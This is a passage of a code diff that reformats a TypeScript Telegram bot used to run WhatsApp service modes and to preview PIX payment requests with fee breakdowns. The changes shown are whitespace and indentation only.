-                    [{ text: "📲 Conectar (Gerar QR Code)", callback_data: "change_num:connect" }],
-                    [{ text: "❌ Cancelar", callback_data: "painel:back" }]
-                ]
+              inline_keyboard: [
+                [{ text: "🔄 Apenas Trocar no Sistema", callback_data: "change_num:only_change" }],
+                [{ text: "📲 Conectar (Gerar QR Code)", callback_data: "change_num:connect" }],
+                [{ text: "❌ Cancelar", callback_data: "painel:back" }]
+              ]
             });
           }
           else if (state?.action === 'pix_auto_await_value' || state?.action === 'awaiting_lead_pix_value') {
@@ -2463,14 +2463,14 @@ async function startTelegramPolling() {
             const valFinal = valLiq - feeSaque;
 
             const previewTxt = `⚠️ <b>CONFIRMAÇÃO - SISTEMA PADRÃO (AUTO)</b>\n\n` +
-                        `💰 <b>Valor Bruto:</b> R$ ${amount.toFixed(2)}\n` +
-                        `👤 <b>Recebedor:</b> ${currentConfig.pixName || 'Padrão'}\n\n` +
-                        `📊 <b>DETALHAMENTO FINANCEIRO:</b>\n` +
-                        `├─ Taxa Gateway (${currentConfig.gatewayFee}%): - R$ ${feeGateway.toFixed(2)}\n` +
-                        `├─ Valor Líquido: R$ ${valLiq.toFixed(2)}\n` +
-                        `├─ Taxa Saque: - R$ ${feeSaque.toFixed(2)}\n` +
-                        `└─ <b>VOCÊ RECEBE: R$ ${valFinal.toFixed(2)}</b>\n\n` +
-                        `<i>Confirma a geração deste PIX para o lead?</i>`;
+              `💰 <b>Valor Bruto:</b> R$ ${amount.toFixed(2)}\n` +
+              `👤 <b>Recebedor:</b> ${currentConfig.pixName || 'Padrão'}\n\n` +
+              `📊 <b>DETALHAMENTO FINANCEIRO:</b>\n` +
+              `├─ Taxa Gateway (${currentConfig.gatewayFee}%): - R$ ${feeGateway.toFixed(2)}\n` +
+              `├─ Valor Líquido: R$ ${valLiq.toFixed(2)}\n` +
+              `├─ Taxa Saque: - R$ ${feeSaque.toFixed(2)}\n` +
+              `└─ <b>VOCÊ RECEBE: R$ ${valFinal.toFixed(2)}</b>\n\n` +
+              `<i>Confirma a geração deste PIX para o lead?</i>`;
 
             const previewKb = {
               inline_keyboard: [
@@ -2500,25 +2500,25 @@ async function startTelegramPolling() {
             if (name.toLowerCase() === 'padrao' || name.toLowerCase() === 'padrão') {
               name = currentConfig.pixName || 'Padrão';
             }
-            
+
             const amount = parseFloat(state.data.amount);
             botStates.set(userId, { action: 'pix_avulso_confirm', data: { amount: amount.toString(), name } });
-            
+
             const feeGateway = amount * (currentConfig.gatewayFee / 100);
             const valLiq = amount - feeGateway;
             const feeSaque = (valLiq * (currentConfig.withdrawalFeePercent / 100)) + currentConfig.withdrawalFeeFixed;
             const valFinal = valLiq - feeSaque;
 
             const txt = `⚠️ <b>CONFIRMAÇÃO - PROTOCOLO AVULSO</b>\n\n` +
-                        `💰 <b>Valor Bruto:</b> R$ ${amount.toFixed(2)}\n` +
-                        `👤 <b>Recebedor:</b> ${name}\n\n` +
-                        `📊 <b>DETALHAMENTO FINANCEIRO:</b>\n` +
-                        `├─ Taxa Gateway (${currentConfig.gatewayFee}%): - R$ ${feeGateway.toFixed(2)}\n` +
-                        `├─ Valor Líquido: R$ ${valLiq.toFixed(2)}\n` +
-                        `├─ Taxa Saque: - R$ ${feeSaque.toFixed(2)}\n` +
-                        `└─ <b>VOCÊ RECEBE: R$ ${valFinal.toFixed(2)}</b>\n\n` +
-                        `<i>Confirma a geração deste PIX manual?</i>`;
-                        
+              `💰 <b>Valor Bruto:</b> R$ ${amount.toFixed(2)}\n` +
+              `👤 <b>Recebedor:</b> ${name}\n\n` +
+              `📊 <b>DETALHAMENTO FINANCEIRO:</b>\n` +
+              `├─ Taxa Gateway (${currentConfig.gatewayFee}%): - R$ ${feeGateway.toFixed(2)}\n` +
+              `├─ Valor Líquido: R$ ${valLiq.toFixed(2)}\n` +
+              `├─ Taxa Saque: - R$ ${feeSaque.toFixed(2)}\n` +
+              `└─ <b>VOCÊ RECEBE: R$ ${valFinal.toFixed(2)}</b>\n\n` +
+              `<i>Confirma a geração deste PIX manual?</i>`;
+
             const kb = {
               inline_keyboard: [
                 [{ text: "🚀 GERAR PROTOCOLO", callback_data: "pix_avulso:exec" }],
@@ -2633,7 +2633,7 @@ async function ensureChromeAndStart() {
   // Aqui apenas verificamos e logamos o status para diagnóstico.
   let hasChrome = false;
   const puppeteerCacheDir = path.join(process.cwd(), '.cache', 'puppeteer');
-  
+
   if (fs.existsSync(puppeteerCacheDir)) {
     const findChrome = (dir: string, depth = 0): string | null => {
       if (depth > 6) return null;
@@ -2646,7 +2646,7 @@ async function ensureChromeAndStart() {
             if (found) return found;
           }
         }
-      } catch (e) {}
+      } catch (e) { }
       return null;
     };
     const cached = findChrome(puppeteerCacheDir);
@@ -2662,15 +2662,15 @@ async function ensureChromeAndStart() {
 
   // Início escalonado dos serviços
   startTelegramPolling();
-  
+
   setTimeout(async () => {
-      const kb = {
-          inline_keyboard: [
-              [{ text: "🤖 Ligar Atendimento Automático", callback_data: "boot:auto" }],
-              [{ text: "👤 Ligar Atendimento Manual", callback_data: "boot:manual" }]
-          ]
-      };
-      await sendTelegram(`🚀 <b>SISTEMA LIGADO</b>\n\nEscolha como deseja operar o WhatsApp Principal (Main):`, undefined, kb);
+    const kb = {
+      inline_keyboard: [
+        [{ text: "🤖 Ligar Atendimento Automático", callback_data: "boot:auto" }],
+        [{ text: "👤 Ligar Atendimento Manual", callback_data: "boot:manual" }]
+      ]
+    };
+    await sendTelegram(`🚀 <b>SISTEMA LIGADO</b>\n\nEscolha como deseja operar o WhatsApp Principal (Main):`, undefined, kb);
   }, 3000);
   // 🌐 Serve Frontend Static Files
   const distPath = path.join(process.cwd(), 'dist');
